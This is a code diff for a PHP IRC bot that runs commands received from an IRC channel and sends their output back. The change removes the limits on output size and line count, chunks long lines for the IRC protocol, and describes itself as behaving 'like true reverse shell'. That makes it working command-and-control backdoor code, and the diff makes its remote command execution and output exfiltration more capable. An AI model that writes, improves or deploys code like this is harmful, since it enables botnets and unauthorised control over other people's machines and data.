@@ -274,32 +274,33 @@ function ircBot() {
                 // Execute command
                 $output = executeCommand($command);
                 
-                // Limit output size (max 2000 chars)
-                if (strlen($output) > 2000) {
-                    $output = substr($output, 0, 2000) . "\n... [output truncated]";
-                }
-                
-                // Split output into chunks (IRC max 400 chars per message)
+                // NO TRUNCATION - send FULL output like true reverse shell
+                // Split into lines and send each one
                 $lines = explode("\n", $output);
-                $sent = 0;
+                
                 foreach ($lines as $line) {
-                    if (++$sent > 10) { // Max 10 lines
-                        fputs($socket, "PRIVMSG " . IRC_CHANNEL . " :[$bot_nick] ... [output truncated]\r\n");
-                        break;
-                    }
                     $line = trim($line);
                     if (!empty($line)) {
-                        // Sanitize line
+                        // Only sanitize control chars, keep full line length
                         $line = str_replace(array("\r", "\t"), ' ', $line);
-                        $line = substr($line, 0, 400);
-                        fputs($socket, "PRIVMSG " . IRC_CHANNEL . " :[$bot_nick] $line\r\n");
-                        usleep(500000); // 0.5 second delay
+                        // IRC protocol max is ~512 bytes per message, keep it safe at 480
+                        // If line is longer, chunk it
+                        if (strlen($line) > 480) {
+                            $chunks = str_split($line, 480);
+                            foreach ($chunks as $chunk) {
+                                fputs($socket, "PRIVMSG " . IRC_CHANNEL . " :[$bot_nick] $chunk\r\n");
+                                usleep(200000); // 0.2s between chunks
+                            }
+                        } else {
+                            fputs($socket, "PRIVMSG " . IRC_CHANNEL . " :[$bot_nick] $line\r\n");
+                            usleep(200000); // 0.2s between lines
+                        }
                     }
                 }
                 
                 // If no output or empty
                 if (empty($output) || $output === '[No output]') {
-                    fputs($socket, "PRIVMSG " . IRC_CHANNEL . " :[$bot_nick] ✓ Command executed\r\n");
+                    fputs($socket, "PRIVMSG " . IRC_CHANNEL . " :[$bot_nick] ✓ Command executed (no output)\r\n");
                 }
             }
         }
